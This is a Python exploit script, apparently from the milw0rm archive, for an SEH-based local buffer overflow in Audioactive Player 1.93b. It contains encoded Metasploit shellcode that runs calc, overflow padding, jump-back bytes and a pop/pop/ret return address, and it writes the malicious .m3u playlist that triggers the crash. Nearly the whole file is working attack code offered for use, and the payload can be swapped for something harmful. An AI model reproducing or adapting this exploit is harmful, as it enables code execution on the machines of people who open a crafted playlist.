#usage: exploit.py
#Open the program then double clic in the exploit file
print "**************************************************************************"
print " Audioactive Player 1.93b (.m3u) Local Buffer Overflow Exploit (SEH)\n"
print " Credits : hack4love\n"
print " Seh Exploit: His0k4\n"
print " Tested on: Windows XP Pro SP3 (EN)\n"
print " Greetings to:"
print " All friends & muslims HaCkers(dz),snakespc.com\n"
print "**************************************************************************"       
			
# win32_exec -  EXITFUNC=seh CMD=calc Size=165 Encoder=JmpCallAdditive http://metasploit.com
shellcode=(
"\xfc\xbb\x5d\x53\x65\x97\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3\x85"
"\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\xa1\xbb\x21\x97\x59\x3c\x21"
"\xd2\x65\xb7\x49\xd8\xed\xc6\x5e\x69\x42\xd1\x2b\x31\x7c\xe0\xc0"
"\x87\xf7\xd6\x9d\x19\xe9\x26\x62\x80\x59\xcc\xa2\xc7\xa6\x0c\xe8"
"\x25\xa9\x4c\x06\xc1\x92\x04\xfd\x2e\x91\x41\x76\x71\x7d\x8b\x62"
"\xe8\xf6\x87\x3f\x7e\x57\x84\xbe\x6b\xec\xa8\x4b\x6a\x19\x59\x17"
"\x49\xd9\x99\x99\x51\x85\x96\x9a\x61\xc0\x69\x62\x8e\x41\x29\x9f"
"\x05\x25\xb6\x32\x92\xad\xce\xa7\xac\xa6\x4f\x87\xaf\xb8\x4f\x63"
"\xc7\x84\x10\x42\xee\x94\xf8\x2d\xf6\xd7\xc5\x55\x57\xbf\x35\x23"
"\x53\x60\xde\xac\xa2\x14\x10\x9a\xa5\xcf\x4e\x45\x36\x6c\x91\x85"
"\xc6\x72\x91\x85\xc6")

payload = "\x41"*(589-len(shellcode))
payload += shellcode
payload += "\xE9\x56\xFF\xFF\xFF" # go back
payload += "\x74\xF9\xFF\xFF" #go back
payload += "\xDE\x19\xD1\x72" # Friendly p/p/r msacm32.drv
payload += "\x44"*900

try:
    out_file = open("exploit.m3u",'w')
    out_file.write("http://www.google.com/"+payload+".mp3\r\n")
    out_file.close()
    raw_input("\nExploit file created!\n")
except:
    print "Error"

# milw0rm.com [2009-05-15]
